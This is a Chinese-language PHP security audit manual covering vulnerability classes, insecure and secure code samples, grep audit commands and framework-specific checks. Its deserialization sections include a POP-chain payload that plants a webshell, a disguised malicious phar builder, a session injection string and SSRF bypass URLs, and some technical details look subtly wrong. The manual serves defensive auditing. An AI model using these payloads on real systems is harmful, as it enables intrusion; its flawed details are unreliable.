---
name: code-audit-php
description: >
  PHP 应用安全代码审计完整手册。覆盖所有主流框架（Laravel、Symfony、CodeIgniter、
  Yii、ThinkPHP、WordPress）和所有常见漏洞类型（SQL 注入、XSS、RCE、文件操作、
  反序列化、SSRF、命令注入、会话安全、加密实现、认证授权、路径遍历、CRLF、
  逻辑漏洞）。每个漏洞类型包含不安全模式识别、审计 grep 命令、利用场景、
  修复方案。附带框架特定审计路径和自动化扫描工具集成。
domain: cybersecurity
subdomain: code-audit
tags: [php, code-audit, laravel, symfony, codeigniter, yii, thinkphp, wordpress, sqli, xss, rce, deserialization, ssrf, file-upload, path-traversal, command-injection]
version: 2.0.0
---

# PHP 代码安全审计 — 完整手册

## 适用场景

- PHP Web 应用上线前安全审计
- CTF 中 PHP 源码审计题目
- 开源 PHP 应用（WordPress 插件、Laravel 包）漏洞挖掘
- PHP 应用被入侵后的代码溯源分析

---

## Part A：通用漏洞审计

### 1. SQL 注入

#### 1.1 不安全模式

```php
// ❌ 字符串拼接 — 所有变体均危险
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $_GET[id]";           // 双引号解析
$sql = "SELECT * FROM users WHERE name = '$_POST[name]'";     // 无转义
$sql = sprintf("SELECT * FROM users WHERE id = %d", $_GET['id']); // 仅整型安全
$sql = "SELECT * FROM users WHERE id = " . intval($_GET['id']); // 有限安全

// ❌ 错误的转义
$id = addslashes($_GET['id']);  // 编码问题可绕过（GBK等）
$sql = "SELECT * FROM users WHERE id = '$id'";

// ❌ ORDER BY / LIMIT 注入（无法参数化）
$order = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $order";  // 直接拼接
```

#### 1.2 安全模式

```php
// ✅ PDO 预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND status = :status");
$stmt->execute(['id' => $id, 'status' => $status]);

// ✅ ORDER BY 白名单
$allowed = ['name', 'date', 'price'];
$order = in_array($_GET['sort'], $allowed) ? $_GET['sort'] : 'name';
$sql = "SELECT * FROM users ORDER BY $order";
```

#### 1.3 审计 Grep

```bash
# 查找 SQL 拼接
grep -rn --include="*.php" -E '\$_GET|\$_POST|\$_REQUEST|\$_COOKIE' . | \
  grep -i -E '(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|ORDER|GROUP)'

# 查找不安全的查询函数
grep -rn --include="*.php" -E '(mysql_query|mysqli_query|pg_query|sqlsrv_query)\s*\(' .

# 查找字符串拼接中的数据库操作
grep -rn --include="*.php" -E '(\.\s*\$_|\$\w+\s*\.\s*"(SELECT|INSERT))' .
```

### 2. XSS（跨站脚本）

#### 2.1 不安全模式

```php
// ❌ 直接输出
echo $_GET['name'];
echo "<div>" . $_POST['content'] . "</div>";
echo "<input value='" . $_GET['q'] . "'>";  // 属性注入

// ❌ 单一上下文转义不够
echo htmlspecialchars($_GET['name']);  // 默认不转义单引号
echo "<input value='" . htmlspecialchars($_GET['name']) . "'>"; // 仍危险

// ❌ JavaScript 上下文
echo "<script>var name = '" . $_GET['name'] . "';</script>";  // 闭合绕过

// ❌ URL 上下文
echo "<a href='" . $_GET['url'] . "'>link</a>";  // javascript: 协议
```

#### 2.2 安全模式

```php
// ✅ HTML 上下文
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// ✅ 属性上下文
echo '<input value="' . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . '">';

// ✅ JavaScript 上下文
echo '<script>var name = ' . json_encode($input, JSON_HEX_TAG) . ';</script>';

// ✅ URL 上下文
if (preg_match('/^https?:\/\//', $url)) {
    echo '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">link</a>';
}

// ✅ Twig / Blade 模板自动转义
{{ name }}           {# 自动 htmlspecialchars #}
{!! name !!}         {# Laravel: 不转义 — 仅用于已知安全内容 #}
```

#### 2.3 审计 Grep

```bash
# 查找未转义输出
grep -rn --include="*.php" -E 'echo\s+\$_(GET|POST|REQUEST|COOKIE)' .
grep -rn --include="*.php" -E 'print\s+\$_(GET|POST|REQUEST|COOKIE)' .

# Laravel Blade 未转义
grep -rn --include="*.blade.php" '{!!' .

# Twig 未转义
grep -rn --include="*.twig" '\|raw' .
```

### 3. 命令注入

#### 3.1 不安全模式

```php
// ❌ 所有命令执行函数 + 用户输入
system("ping " . $_GET['host']);
exec("convert " . $_FILES['image']['tmp_name'] . " output.png");
shell_exec("nslookup " . $domain);
passthru("cat " . $_GET['file']);
popen("grep -r " . $_GET['q'] . " /var/log", "r");
proc_open("tar -xf " . $_GET['archive'], ...);

// ❌ 反引号
$output = `ls -la $_GET[dir]`;

// ❌ escapeshellarg 不够（参数注入）
$host = escapeshellarg($_GET['host']);
system("ping -c 4 $host");  // 安全（参数受控）

$file = escapeshellarg($_GET['file']);
system("tar -xf $file --exclude=" . $_GET['exclude']); // 不安全（新参数注入）
```

#### 3.2 安全模式

```php
// ✅ 白名单验证
$allowed_hosts = ['google.com', 'github.com'];
if (in_array($_GET['host'], $allowed_hosts)) {
    system("ping -c 4 " . escapeshellarg($_GET['host']));
}

// ✅ 使用 PHP 原生函数替代
// 不用 system("rm $file") → 用 unlink($file)
// 不用 exec("mkdir $dir") → 用 mkdir($dir)
// 不用 shell_exec("cat $f") → 用 file_get_contents($f)
```

### 4. 文件操作漏洞

#### 4.1 文件上传

```php
// ❌ 不安全：仅检查扩展名
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, ['jpg', 'png'])) {  // 双扩展名绕过：shell.php.jpg
    move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['name']);
}

// ❌ 不安全：MIME 类型可伪造
if ($_FILES['file']['type'] == 'image/jpeg') { ... }

// ❌ 危险存储路径
$path = "/uploads/" . $_POST['filename']; // 路径遍历
move_uploaded_file($_FILES['file']['tmp_name'], $path);
```

```php
// ✅ 安全上传
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg' => 'jpg', 'image/png' => 'png'];

if (!isset($allowed_mimes[$mime])) die('Invalid type');

$ext = $allowed_mimes[$mime];
$filename = bin2hex(random_bytes(16)) . '.' . $ext;  // 随机文件名
$upload_dir = realpath('/var/www/uploads/');
$dest = $upload_dir . '/' . $filename;

// 防止路径遍历
if (strpos(realpath(dirname($dest)), $upload_dir) !== 0) die('Invalid path');

// 验证是真实图片
if (!@getimagesize($_FILES['file']['tmp_name'])) die('Not an image');

move_uploaded_file($_FILES['file']['tmp_name'], $dest);
```

#### 4.2 文件读取/路径遍历

```php
// ❌ 路径遍历
$content = file_get_contents("/var/www/files/" . $_GET['file']);
// ?file=../../../etc/passwd
// ?file=....//....//etc/passwd  (双编码绕过)
// ?file=/etc/passwd (绝对路径)

include("/var/www/pages/" . $_GET['page'] . ".php");
// ?page=../../../etc/passwd%00  (空字节截断，PHP < 5.3.4)

// ❌ 不安全的 basename 使用
$file = basename($_GET['file']);  // /etc/passwd → passwd（OK）
// 但：../../../etc/passwd → passwd（OK）
// 注意：/etc/passwd → passwd（只取文件名）
```

```php
// ✅ 安全路径验证
$base_dir = realpath('/var/www/files/');
$requested = realpath($base_dir . '/' . $_GET['file']);

if ($requested === false || strpos($requested, $base_dir) !== 0) {
    die('Access denied');
}
```

#### 4.3 文件写入

```php
// ❌ 不安全
file_put_contents($_POST['path'], $_POST['content']);
fwrite(fopen($_GET['log'], 'a'), $data);

// ✅ 安全
$base = '/var/www/data/';
$name = basename($_POST['filename']);
if (!preg_match('/^[a-zA-Z0-9_-]+\.[a-z]+$/', $name)) die('Invalid name');
file_put_contents($base . $name, $content);
```

### 5. 反序列化漏洞

#### 5.1 不安全模式

```php
// ❌ 反序列化用户输入
$obj = unserialize($_GET['data']);
$obj = unserialize($_COOKIE['cart']);

// ❌ PHP Sessions 使用文件存储时
// 如果 session.serialize_handler 可被操纵 → 反序列化注入
```

#### 5.2 利用链（POP Chain）

```php
// 常见利用入口
class Logger {
    public $logFile;
    public $logData;

    function __destruct() {
        file_put_contents($this->logFile, $this->logData);  // 文件写入
    }
}

// 构造恶意序列化数据
$obj = new Logger();
$obj->logFile = '/var/www/html/shell.php';
$obj->logData = '<?php system($_GET[cmd]); ?>';
echo serialize($obj);
// O:6:"Logger":2:{s:7:"logFile";s:27:"/var/www/html/shell.php";s:7:"logData";s:30:"<?php system($_GET[cmd]); ?>";}
```

```php
// ✅ 安全替代
$data = json_decode($_GET['data'], true);  // JSON 无对象实例化
$obj = unserialize($data, ['allowed_classes' => false]);  // PHP 7+: 禁止类实例化
```

### 6. SSRF

```php
// ❌ 用户控制 URL
$content = file_get_contents($_GET['url']);
$ch = curl_init($_POST['api_url']);
$response = curl_exec($ch);

// ❌ 不完全的 URL 验证
if (strpos($_GET['url'], 'http://') === 0) { ... }  // 绕过：http://127.0.0.1
if (!filter_var($url, FILTER_VALIDATE_URL)) { ... }  // 绕过：http://127.0.0.1@evil.com
```

```php
// ✅ 安全 SSRF 防护
function safe_fetch_url($url) {
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['host'])) return false;

    // 解析 DNS 获取真实 IP
    $ip = gethostbyname($parsed['host']);

    // 黑名单检查
    $blocked = ['127.0.0.1', '0.0.0.0', '169.254.169.254', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
    foreach ($blocked as $cidr) {
        if (ip_in_range($ip, $cidr)) return false;
    }

    // 白名单域名
    $allowed_domains = ['api.github.com', 'api.stripe.com'];
    if (!in_array($parsed['host'], $allowed_domains)) return false;

    // 强制使用解析后的 IP
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RESOLVE, [$parsed['host'] . ':' . $parsed['port'] . ':' . $ip]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);  // 禁止重定向到内网
    return curl_exec($ch);
}
```

### 7. 认证与会话安全

```php
// ❌ 不安全会话
session_set_cookie_params(0, '/', '', false, false);  // HTTP only=false, Secure=false
$_SESSION['user'] = $_POST['username'];  // 无重生成 session ID

// ❌ 不安全的 "记住我"
setcookie('remember', base64_encode($user_id . ':' . md5($user_id . $secret)), ...);

// ❌ 密码存储
$hash = md5($_POST['password']);           // 太弱
$hash = sha1($_POST['password']);          // 太弱
$hash = md5($_POST['password'] . $salt);   // 仍不够

// ❌ 不安全比较（时间攻击）
if ($_GET['token'] === $expected_token) { ... }

// ✅ 安全实现
session_set_cookie_params(['lifetime' => 0, 'path' => '/', 'secure' => true, 'httponly' => true, 'samesite' => 'Strict']);
session_regenerate_id(true);  // 登录后重生成

$hash = password_hash($password, PASSWORD_ARGON2ID);  // 或 PASSWORD_BCRYPT
if (password_verify($input, $hash)) { ... }

if (hash_equals($expected_token, $_GET['token'])) { ... }  // 恒定时间比较
```

### 8. 加密实现

```php
// ❌ 不安全
$encrypted = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_ECB));  // 已废弃
$encrypted = openssl_encrypt($data, 'AES-128-ECB', $key);  // ECB 不安全
$iv = str_repeat("\x00", 16);  // 固定 IV
$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);  // 无认证

// ✅ 安全
$iv = random_bytes(16);
$ciphertext = openssl_encrypt($data, 'AES-256-GCM', $key, OPENSSL_RAW_DATA, $iv, $tag);
$encoded = base64_encode($iv . $tag . $ciphertext);  // 一起传输
```

---

## Part B：框架特定审计路径

### Laravel

```bash
# 关键审计文件
app/Http/Controllers/     # 控制器逻辑
routes/web.php            # 路由定义
routes/api.php            # API 路由
app/Http/Middleware/       # 中间件
config/auth.php           # 认证配置
config/session.php        # 会话配置

# Laravel 常见问题
grep -rn 'DB::raw' app/                    # 原始 SQL
grep -rn 'DB::select.*\.' app/             # SQL 拼接
grep -rn '{!!' resources/views/            # 未转义 Blade 输出
grep -rn '::all()' app/                    # 未过滤的模型查询（mass assignment）
grep -rn 'unserialize' app/                # 反序列化
grep -rn 'exec\|system\|shell_exec\|passthru\|popen' app/
grep -rn 'Storage::disk.*\$' app/          # 用户控制的磁盘路径
grep -rn 'request()->file' app/            # 文件上传
```

### WordPress

```bash
# 关键审计文件
plugin-name/plugin-name.php     # 入口文件
plugin-name/includes/           # 核心逻辑
plugin-name/admin/              # 后台逻辑
plugin-name/public/             # 前台逻辑

# WordPress 特有安全问题
grep -rn '\$_POST\|\$_GET\|\$_REQUEST' . --include="*.php" | grep -v 'sanitize\|esc_\|wp_verify_nonce'
grep -rn 'eval\s*(' . --include="*.php"                          # 危险 eval
grep -rn 'wp_redirect.*\$_' . --include="*.php"                 # 开放重定向
grep -rn 'prepare.*\.\s*\$_' . --include="*.php"                # SQL 注入
grep -rn 'echo\s*\$_' . --include="*.php" | grep -v 'esc_html\|esc_attr\|esc_url'  # XSS
grep -rn 'wp_nonce' . --include="*.php"                          # CSRF 检查
grep -rn 'is_admin\|current_user_can' . --include="*.php"       # 权限检查
```

### ThinkPHP

```bash
# ThinkPHP 特有漏洞类型
grep -rn 'input.*\.' app/                   # 输入处理
grep -rn 'Request::param' app/              # 参数获取
grep -rn 'Db::query\|Db::execute' app/      # 原始查询
grep -rn '->where.*\$' app/                 # 条件注入
grep -rn 'Request::instance()->input' app/  # 直接输入

# ThinkPHP 历史漏洞关注点
# - 5.x RCE via Request class method override
# - 5.x SQL injection via Request::order/orderBy
# - 5.x 文件包含 via template engine
# - 6.x 反序列化利用链
```

---

## Part C：自动化审计工具

### 半自动化审计流程

```bash
# 1. 依赖扫描
composer audit                           # Composer 内置

# 2. 静态分析
php vendor/bin/phpstan analyse app/ -l 5  # PHPStan
vendor/bin/psalm --no-cache               # Psalm

# 3. 安全专用扫描
# Semgrep — 最佳 PHP 安全规则集
semgrep --config p/php-security-audit --config p/xss --config p/sql-injection .

# 4. 关键函数全局搜索
grep_functions() {
    dir=$1
    echo "=== SQL Injection ==="
    grep -rn --include="*.php" -E '(mysql_query|mysqli_query|pg_query|PDO::query)\s*\(' "$dir" | \
      grep -v 'prepare\|bindParam\|execute'

    echo "=== Command Injection ==="
    grep -rn --include="*.php" -E '(system|exec|shell_exec|passthru|popen|proc_open)\s*\(' "$dir"

    echo "=== File Operations ==="
    grep -rn --include="*.php" -E '(file_get_contents|fopen|readfile|include|require|file_put_contents)\s*\(\s*\$_' "$dir"

    echo "=== Deserialization ==="
    grep -rn --include="*.php" 'unserialize\s*\(' "$dir"

    echo "=== Unsafe Output ==="
    grep -rn --include="*.php" -E '(echo|print|printf)\s+\$_' "$dir" | \
      grep -v 'htmlspecialchars\|esc_html\|htmlentities'

    echo "=== Crypto ==="
    grep -rn --include="*.php" -E '(md5|sha1)\s*\(' "$dir" | grep -v 'password_verify\|hash_equals'
    grep -rn --include="*.php" 'mcrypt_' "$dir"

    echo "=== Auth ==="
    grep -rn --include="*.php" '===' "$dir" | grep -i 'token\|password\|secret\|key' | \
      grep -v 'hash_equals'
}

grep_functions /path/to/app
```

---

## 速查：PHP 危险函数表

| 函数 | 风险 | 安全替代 |
|------|------|---------|
| `eval()` | RCE | 重构代码逻辑 |
| `assert()` | RCE (PHP < 8) | 不用于用户输入 |
| `system/exec/shell_exec/passthru` | 命令注入 | PHP 原生函数 |
| `unserialize()` | 反序列化 RCE | `json_decode()` |
| `file_get_contents($url)` | SSRF | URL 白名单 + IP 校验 |
| `include/require` + 用户输入 | LFI/RFI | 白名单文件名 |
| `move_uploaded_file` 不验证 | 恶意上传 | MIME + 内容验证 + 随机名 |
| `extract()` | 变量覆盖 | 不使用或 `EXTR_SKIP` |
| `parse_str()` | 变量覆盖 | 指定第二参数 |
| `preg_replace()` /e | RCE (PHP < 7) | `preg_replace_callback()` |
| `header()` + 用户输入 | HTTP 响应分裂 | 过滤 CRLF |
| `mysqli_real_escape_string` | 宽字节注入 | PDO 预处理 |
| `md5/sha1` 密码哈希 | 弱哈希 | `password_hash()` |
| `rand()` | 可预测 | `random_int()` |

## 前置条件

- PHP 源码可访问
- 了解目标框架的基本结构
- PHP 7.x+ 特性了解（旧版漏洞模式不同）
- Semgrep / PHPStan 已安装（推荐）

---

## Part C：2025-2026 更新

### C.1 PHP 反序列化攻击链深入

#### C.1.1 POP Chain 构造方法论

POP (Property-Oriented Programming) Chain 是 PHP 反序列化利用的核心技术。审计时需要追踪魔术方法的调用链。

```php
// ==================== 常见魔术方法入口 ====================
// __destruct()       — 对象销毁时触发（最常见入口）
// __wakeup()         — unserialize() 时触发
// __toString()       — 对象被当作字符串使用时触发
// __call()           — 调用不存在的方法时触发
// __get()            — 访问不存在的属性时触发
// __set()            — 设置不存在的属性时触发
// __invoke()         — 对象被当作函数调用时触发
// __unserialize()    — PHP 7.4+ 自定义反序列化逻辑

// ==================== POP Chain 构造示例 ====================
// 入口类：__destruct → 中间类：__toString → Sink：命令执行

class CacheHandler {                    // 入口类
    public $adapter;
    function __destruct() {
        $this->adapter->cleanup();      // 调用 adapter 的 cleanup 方法
    }
}

class TemplateEngine {                  // 中间类
    public $template;
    function __call($name, $args) {     // cleanup() 不存在 → 触发 __call
        return $this->render($this->template);
    }
    function render($tpl) {
        eval("?>".$tpl);                // Sink: 任意代码执行
    }
}

// 构造 payload
$chain = new CacheHandler();
$chain->adapter = new TemplateEngine();
$chain->adapter->template = '<?php system("id"); ?>';
echo serialize($chain);
// 利用时：unserialize($_GET['data'])
```

#### C.1.2 phar:// 伪协议触发反序列化

```php
// ==================== phar:// 反序列化原理 ====================
// PHP 内核在解析 phar 文件元数据时调用 phar_parse_metadata()
// → 内部调用 php_var_unserialize() 对 metadata 进行反序列化
// 因此即使不直接调用 unserialize()，只要文件操作函数使用 phar:// 协议
// 即可触发反序列化

// 受影响的文件操作函数（完整列表）
file_exists('phar://malicious.phar');        // ✅ 触发反序列化
file_get_contents('phar://malicious.phar');  // ✅
fopen('phar://malicious.phar', 'r');         // ✅
is_file('phar://malicious.phar');            // ✅
is_dir('phar://malicious.phar');             // ✅
filemtime('phar://malicious.phar');          // ✅
fileowner('phar://malicious.phar');          // ✅
fileperms('phar://malicious.phar');          // ✅
stat('phar://malicious.phar');               // ✅
lstat('phar://malicious.phar');              // ✅
fileinode('phar://malicious.phar');          // ✅
filesize('phar://malicious.phar');           // ✅
copy('phar://malicious.phar', '/tmp/x');     // ✅
include('phar://malicious.phar');            // ✅
hash_file('md5', 'phar://malicious.phar');   // ✅ (PHP 8.0-)
getimagesize('phar://malicious.phar');       // ✅
exif_read_data('phar://malicious.phar');     // ✅

// ==================== 构造恶意 phar 文件 ====================
<?php
class EvilClass {
    public $cmd = 'id';
    function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new EvilClass());         // 反序列化入口
$phar->addFromString('test.txt', 'dummy');
$phar->stopBuffering();
?>

// ==================== 绕过技巧 ====================
// 1. 文件头伪装：在 stub 前添加 GIF89a 绕过扩展名检测
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

// 2. 后缀绕过：只要文件内容是合法 phar 格式，扩展名不重要
//    phar://evil.gif/evil   ← 即使后缀是 .gif 也能触发

// 3. 协议变体：
//    phar://path/to/evil.phar
//    phar://path/to/evil.gif    ← 扩展名不影响
//    php://filter/resource=phar://evil.phar  ← filter 链包装

// ==================== 防御 ====================
// PHP 8.0+ 已移除 phar 元数据自动反序列化
// PHP 7.x 必须过滤所有文件操作函数的输入
if (strpos($input, 'phar://') === 0) { die('Blocked'); }
// 或在 php.ini 中禁用: phar.readonly = On
```

#### C.1.3 Session 反序列化注入

```php
// ==================== Session 处理器不匹配攻击 ====================
// 当 php.ini 中 session.serialize_handler 与代码中不一致时
// 可注入序列化对象

// php.ini: session.serialize_handler = php
// 代码中: ini_set('session.serialize_handler', 'php_serialize');

// 利用方式：
// 1. 在使用 php_serialize 的页面设置 session 值为序列化字符串
$_SESSION['data'] = '|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}';
// 2. 当使用 php handler 的页面读取 session 时
//    php handler 以 | 分隔 key|value
//    反序列化时将 O:4:"Evil"... 作为值解析 → 触发对象实例化

// 审计要点
grep -rn 'session.serialize_handler' . --include="*.php"
grep -rn 'ini_set.*session' . --include="*.php"
```

### C.2 框架安全审计要点（2025 更新）

#### C.2.1 Laravel 安全审计

```bash
# ==================== Laravel 审计关键路径 ====================
# 核心配置
config/app.php              # APP_KEY、debug 模式、trusted proxy
config/auth.php             # 认证 guard、provider 配置
config/database.php         # 数据库连接
config/session.php          # session driver、lifetime
config/cors.php             # CORS 策略
.env                        # 敏感信息泄露检查

# 审计 grep 命令集
# 1. SQL 注入
grep -rn 'DB::raw\|DB::select\|DB::statement\|DB::unprepared' app/ --include="*.php"
grep -rn 'whereRaw\|orderByRaw\|havingRaw\|selectRaw' app/ --include="*.php" | grep '\$_\|request('
grep -rn '->where.*\.\s*\$' app/ --include="*.php"  # where 条件拼接

# 2. Mass Assignment（批量赋值）
grep -rn 'Model::create\|Model::update\|->fill(' app/ --include="*.php"
# 检查对应 Model 是否定义了 $fillable 或 $guarded
grep -rn 'protected \$guarded\|protected \$fillable' app/ --include="*.php"
# ❌ 危险: protected $guarded = [];  (空数组 = 不保护任何字段)

# 3. 未授权 API（缺少 middleware）
grep -rn 'Route::' routes/ --include="*.php" | grep -v 'middleware\|auth\|verified'
# 检查是否所有敏感路由都有 auth 中间件

# 4. 文件操作
grep -rn 'Storage::\|File::\|UploadedFile' app/ --include="*.php"
grep -rn 'file_get_contents\|fopen\|readfile' app/ --include="*.php" | grep '\$\|request'

# 5. Blade 模板未转义
grep -rn '{!!' resources/views/ --include="*.blade.php"

# 6. 反序列化
grep -rn 'unserialize' app/ --include="*.php"
grep -rn '__destruct\|__wakeup\|__toString\|__invoke' app/ --include="*.php"

# 7. 命令执行
grep -rn 'Process::\|Artisan::call\|exec\|system\|shell_exec' app/ --include="*.php"

# 8. 环境信息泄露
grep -rn 'APP_DEBUG.*true' .env
# 生产环境必须 APP_DEBUG=false

# ==================== Laravel 特有漏洞 ====================
# CVE-2021-3129: Ignition <=2.5.1 RCE
#   利用链: file_get_contents + phar 反序列化
#   触发点: _ignition/execute-solution 端点
#   修复: 升级 Ignition >=2.5.2 或 Laravel >=8.4.3

# CVE-2024-XXX: Laravel 10/11 新特性安全注意
#   - Invokable Controllers 缺少 middleware 绑定
#   - Livewire 组件的属性批量赋值
#   - Eloquent Cast 的自定义转换可能引入风险
```

#### C.2.2 ThinkPHP 安全审计

```bash
# ==================== ThinkPHP 审计关键路径 ====================
# 目录结构 (以 ThinkPHP 6/8 为准)
app/controller/             # 控制器
app/middleware/             # 中间件
config/app.php              # 应用配置
config/database.php         # 数据库配置
route/app.php               # 路由定义

# 审计 grep 命令集
# 1. SQL 注入
grep -rn 'Db::query\|Db::execute\|->query(' app/ --include="*.php"
grep -rn '->where.*\.\s*\$' app/ --include="*.php"
grep -rn '->whereRaw\|->fieldRaw\|->orderRaw' app/ --include="*.php" | grep 'request\|\$_'
# ThinkPHP 特有: where 数组注入
# ->where(['id' => $_GET['id']])  如果 id 传入 ['exp', '1=1'] 则触发

# 2. RCE 入口（ThinkPHP 历史漏洞）
grep -rn 'Request::input\|input(' app/ --include="*.php" | grep 'filter\|server'
# ThinkPHP 5.x: filter 参数可被覆盖 → 任意函数调用
# ThinkPHP 5.0.x: Request class method override via _method 参数
grep -rn 'var_method\|_method' app/ --include="*.php"

# 3. 模板引擎注入
grep -rn '{php}\|{include\|{:(' app/ --include="*.html"
# ThinkPHP 模板中 {php} 标签允许执行任意 PHP 代码
# {:function()} 直接调用函数

# 4. 反序列化利用链（ThinkPHP 6.x）
grep -rn '__destruct\|__wakeup\|__toString' vendor/topthink/ --include="*.php"
# ThinkPHP 6.x POP Chain 核心 gadget:
#   think\middleware\SessionInit::__destruct()
#   → think\cache\Driver::clear()
#   → think\filesystem\driver\Local::deletePath()
#   最终可实现文件删除 / 任意文件写入

# 5. 路由绕过
grep -rn 'Route::any\|Route::miss' route/ --include="*.php"
# 检查是否有未授权的全局路由

# ==================== ThinkPHP 版本特定漏洞 ====================
# TP 5.0.x: RCE via _method 参数覆盖 (CVE-2018-20062)
# TP 5.0.x: SQL 注入 via Request::order()
# TP 5.1.x: RCE via captcha route + cache file inclusion
# TP 6.0.x: 反序列化 POP Chain → 文件写入/删除
# TP 6.0.12+: 反序列化漏洞修复不完整 (GitHub Issue #2717)
# TP 8.x: 路由注解可能遗漏 middleware
```

#### C.2.3 Symfony 安全审计

```bash
# ==================== Symfony 审计关键路径 ====================
# 目录结构
src/Controller/             # 控制器
config/packages/security.yaml  # 安全配置
config/packages/framework.yaml # 框架配置
config/routes.yaml          # 路由配置
templates/                  # Twig 模板

# 审计 grep 命令集
# 1. SQL 注入 (Doctrine)
grep -rn 'createQuery\|createNativeQuery\|ResultSetMapping' src/ --include="*.php"
grep -rn "getRepository.*->createQueryBuilder.*\.\s*\$" src/ --include="*.php"
grep -rn '->where.*\.\s*\$\|->andWhere.*\.\s*\$' src/ --include="*.php"
# ❌ 不安全: ->where('u.name = "' . $name . '"')
# ✅ 安全: ->where('u.name = :name')->setParameter('name', $name)

# 2. Twig 模板注入
grep -rn '|raw' templates/ --include="*.twig"
grep -rn '{{.*\$_\|{{.*request' templates/ --include="*.twig"
# Symfony 5/6 默认 Twig 自动转义，但 |raw 跳过

# 3. 反序列化（Symfony 特有）
grep -rn 'unserialize\|Serializer::deserialize' src/ --include="*.php"
# Symfony Serializer 组件默认不实例化对象（安全）
# 但自定义 Normalizer 可能引入风险
grep -rn 'ObjectNormalizer\|CustomNormalizer' src/ --include="*.php"

# 4. 安全配置审计
# 检查 security.yaml
# - access_control 是否覆盖所有敏感路径
# - firewalls 是否正确配置
# - provider 配置是否安全

# 5. Expression Language 注入
grep -rn 'ExpressionLanguage\|evaluateExpression\|Expression(' src/ --include="*.php"
# Symfony Expression Language 如果接受用户输入，可能被注入

# 6. Dotenv 泄露
grep -rn 'APP_ENV.*dev\|APP_DEBUG.*1' .env
# 生产环境: APP_ENV=prod, APP_DEBUG=0

# ==================== Symfony 特有漏洞 ====================
# CVE-2022-23631: Notifier 组件 SSRF (Symfony 5.4-6.1)
# CVE-2023-XXX: Serializer 反序列化绕过
# Symfony 6.x/7.x: 新的 Attribute 路由可能遗漏安全检查
```

### C.3 PHP 8.x 安全变更

```php
// ==================== PHP 8.0 安全相关变更 ====================

// 1. phar:// 不再触发反序列化（重要！）
// PHP 7.x: file_exists('phar://evil.phar') → 触发反序列化
// PHP 8.0+: phar 元数据不再自动反序列化
// 影响: 大量 phar 反序列化利用链失效

// 2. assert() 不再执行字符串参数
// PHP 7.x: assert('system("id")') → 执行代码
// PHP 8.0+: assert() 仅接受表达式，字符串参数被弃用
assert("system('id')");  // PHP 8: Error

// 3. 命名参数注入（新攻击面！）
// PHP 8.0+ 支持命名参数，可绕过函数默认值
function createUser($name, $role = 'user', $is_admin = false) {
    // ...
}
createUser(name: 'alice', is_admin: true);  // 命名参数跳过 $role
// 审计: 检查所有接收用户输入的函数调用是否可通过命名参数注入

// 4. filter_var() 绕过更新
// PHP 8.1: FILTER_FLAG_ENCODE_AMP 行为变更
// FILTER_VALIDATE_URL 仍可被绕过:
$url = "http://127.0.0.1:80@evil.com";
filter_var($url, FILTER_VALIDATE_URL);  // 仍然返回 true
// 0:// 等协议可绕过:
filter_var("0://evil.com", FILTER_VALIDATE_URL);  // true in some versions

// 5. str_contains/str_starts_with/str_ends_with（PHP 8.0+）
// 替代 strpos 但不改变安全性

// 6. match 表达式（替代 switch）
// match 严格比较（===），减少松散比较漏洞

// 7. 构造函数属性提升（PHP 8.0+）
class User {
    public function __construct(
        public string $name,        // 直接提升为属性
        public string $role = 'user'
    ) {}
}
// 安全注意: 反序列化时仍会触发 __destruct/__wakeup

// ==================== PHP 8.1 安全相关变更 ====================
// 8. Enum 支持（减少魔术常量误用）
enum Role: string {
    case Admin = 'admin';
    case User = 'user';
}

// 9. readonly 属性（减少属性篡改风险）
class Config {
    public readonly string $secret;
    // 只能在构造函数中赋值

// 10. fiber（协程）
// 新的并发模型，注意共享状态安全

// ==================== PHP 8.2/8.3 安全相关变更 ====================
// 11. readonly class（PHP 8.2）
// 所有属性自动 readonly

// 12. DNF 类型（PHP 8.2）
// 更严格的类型检查

// 13. #[\SensitiveParameter] 属性（PHP 8.2）
function connect(#[\SensitiveParameter] string $password) {
    // 堆栈跟踪中 $password 值被替换为 SensitiveParameterValue
    // 防止日志/错误信息泄露密码
}

// 14. 命名参数注入深度审计
// 框架内部函数调用可能被命名参数覆盖
// 例: Laravel Eloquent Model::create() 的内部参数
User::create([
    'name' => 'alice',
    'email' => 'a@b.com',
    // PHP 8: 理论上可通过命名参数覆盖内部行为
]);

// ==================== 审计 PHP 8.x 特有攻击面 ====================
// 搜索命名参数注入风险
grep -rn '->.*\(' app/ --include="*.php" | grep 'request\|input\|\$_' | \
  grep -E '\w+:\s*\$'
// 搜索 SensitiveParameter 使用
grep -rn 'SensitiveParameter' app/ --include="*.php"
// 搜索 readonly 遗漏
grep -rn 'class.*Config\|class.*Setting' app/ --include="*.php" | grep -v 'readonly'
```

### C.4 Composer 依赖安全审计

```bash
# ==================== Composer 依赖审计 ====================

# 1. 检查已知漏洞
composer audit                  # Composer 2.2+ 内置
composer audit --format=json    # JSON 输出
composer audit --abandoned      # 同时检查废弃包

# 2. 更新依赖
composer outdated               # 查看过时包
composer outdated --direct      # 仅直接依赖
composer update --dry-run       # 模拟更新

# 3. 依赖分析
composer show                   # 列出所有依赖
composer show --tree            # 树形显示
